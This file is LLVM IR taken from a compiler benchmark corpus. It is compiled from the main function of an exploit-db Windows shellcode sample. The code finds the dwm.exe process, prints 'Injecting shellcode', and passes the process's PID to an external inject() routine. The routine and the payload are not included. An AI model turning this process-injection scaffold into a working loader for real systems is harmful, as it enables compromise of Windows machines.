; ModuleID = '/home/carl/AnghaBench/exploitdb/shellcodes/windows_x86-64/extr_40781.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/shellcodes/windows_x86-64/extr_40781.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i8*, i32 }

@__const.main.program_name = private unnamed_addr constant [8 x i8] c"dwm.exe\00", align 1
@TH32CS_SNAPPROCESS = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [35 x i8] c"CreateToolhelp32Snapshot() Failed.\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"Process32First() Failed.\00", align 1
@TRUE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [32 x i8] c"No infomation found about \22%s\22 \00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"Program name:%s\0AProcess id: %d\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"\0AInjecting shellcode\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [8 x i8], align 1
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca %struct.TYPE_4__, align 8
  store i32 0, i32* %1, align 4
  %6 = bitcast [8 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %6, i8* align 1 getelementptr inbounds ([8 x i8], [8 x i8]* @__const.main.program_name, i32 0, i32 0), i64 8, i1 false)
  store i64 0, i64* %3, align 8
  %7 = load i32, i32* @TH32CS_SNAPPROCESS, align 4
  %8 = call i64 @CreateToolhelp32Snapshot(i32 %7, i32 0)
  store i64 %8, i64* %4, align 8
  %9 = load i64, i64* %4, align 8
  %10 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %11 = icmp eq i64 %9, %10
  br i1 %11, label %12, label %14

12:                                               ; preds = %0
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %54

14:                                               ; preds = %0
  %15 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %5, i32 0, i32 0
  store i32 24, i32* %15, align 8
  %16 = load i64, i64* %4, align 8
  %17 = call i32 @Process32First(i64 %16, %struct.TYPE_4__* %5)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %21, label %19

19:                                               ; preds = %14
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %54

21:                                               ; preds = %14
  br label %22

22:                                               ; preds = %33, %21
  %23 = getelementptr inbounds [8 x i8], [8 x i8]* %2, i64 0, i64 0
  %24 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %5, i32 0, i32 1
  %25 = load i8*, i8** %24, align 8
  %26 = getelementptr inbounds [8 x i8], [8 x i8]* %2, i64 0, i64 0
  %27 = call i32 @strlen(i8* %26)
  %28 = call i64 @strncmp(i8* %23, i8* %25, i32 %27)
  %29 = icmp eq i64 0, %28
  br i1 %29, label %30, label %32

30:                                               ; preds = %22
  %31 = load i64, i64* @TRUE, align 8
  store i64 %31, i64* %3, align 8
  br label %37

32:                                               ; preds = %22
  br label %33

33:                                               ; preds = %32
  %34 = load i64, i64* %4, align 8
  %35 = call i64 @Process32Next(i64 %34, %struct.TYPE_4__* %5)
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %22, label %37

37:                                               ; preds = %33, %30
  %38 = load i64, i64* %3, align 8
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %43, label %40

40:                                               ; preds = %37
  %41 = getelementptr inbounds [8 x i8], [8 x i8]* %2, i64 0, i64 0
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %41)
  br label %53

43:                                               ; preds = %37
  %44 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %5, i32 0, i32 1
  %45 = load i8*, i8** %44, align 8
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %5, i32 0, i32 2
  %47 = load i32, i32* %46, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %45, i32 %47)
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %50 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %5, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = call i32 @inject(i32 %51)
  br label %53

53:                                               ; preds = %43, %40
  store i32 0, i32* %1, align 4
  br label %54

54:                                               ; preds = %53, %19, %12
  %55 = load i32, i32* %1, align 4
  ret i32 %55
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @CreateToolhelp32Snapshot(i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @Process32First(i64, %struct.TYPE_4__*) #2

declare dso_local i64 @strncmp(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @Process32Next(i64, %struct.TYPE_4__*) #2

declare dso_local i32 @inject(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
